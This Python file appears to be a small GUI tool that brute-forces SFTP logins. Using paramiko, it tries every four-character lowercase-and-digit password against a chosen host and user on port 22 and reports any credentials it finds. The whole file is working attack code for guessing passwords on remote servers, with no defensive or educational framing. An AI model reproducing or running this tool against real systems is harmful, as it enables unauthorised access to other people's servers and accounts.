import itertools
import string
import paramiko  # Import for SFTP connections
import tkinter as tk  # Import tkinter to use tk in this file
from concurrent.futures import ThreadPoolExecutor  # Import ThreadPoolExecutor
import time  # Import time for sleep functionality

# Function to perform a single SFTP connection attempt
def attempt_connection_sftp(host, user, password, output_text, stop_event):
    while not stop_event.is_set():  # Check for stop signal
        output_text.insert(tk.END, f"[+] Checking SFTP password: {password} for user: {user} on host: {host}\n")
        try:
            transport = paramiko.Transport((host, 22))  # Assuming default SFTP port
            transport.connect(username=user, password=password)  
            sftp = paramiko.SFTPClient.from_transport(transport)
            output_text.insert(tk.END, f"[+] Found SFTP credentials: {user}:{password}\n")  # Print found credentials
            sftp.close()  # Close the SFTP connection
            transport.close()  # Close the transport connection
            return True  # Indicate success
        except paramiko.AuthenticationException:
            return False  # Invalid credentials
        except Exception as e:
            output_text.insert(tk.END, f"[X] Exception: {e}\n")  # Print any other exceptions
            return False  # Indicate failure

# Function to perform brute force attack
def brute_force_attack(host, user, output_text, stop_event):
    charset = string.ascii_lowercase + string.digits  # Only lowercase letters and digits
    fixed_length = 4  # Fixed password length of 4

    # Create a ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Generate passwords one at a time
        for password_tuple in itertools.product(charset, repeat=fixed_length):
            password = ''.join(password_tuple)
            output_text.delete(1.0, tk.END)  # Clear previous output
            output_text.insert(tk.END, f"[+] Checking password: {password}\n")  # Show current password
            
            # Attempt to connect with the generated password
            # IMPORTANT: This check is crucial for stopping the brute force attack
            # If a valid password is found, the loop will break immediately.
            if stop_event.is_set():  # Check for stop signal
                break
            
            future = executor.submit(attempt_connection_sftp, host, user, password, output_text, stop_event)
            if future.result():
                break
            
            # Introduce a small delay between attempts
            time.sleep(0.04)  # Delay for x seconds (adjust as needed)

    output_text.insert(tk.END, "[+] Finished brute force attack.\n")  # Indicate that the attack is complete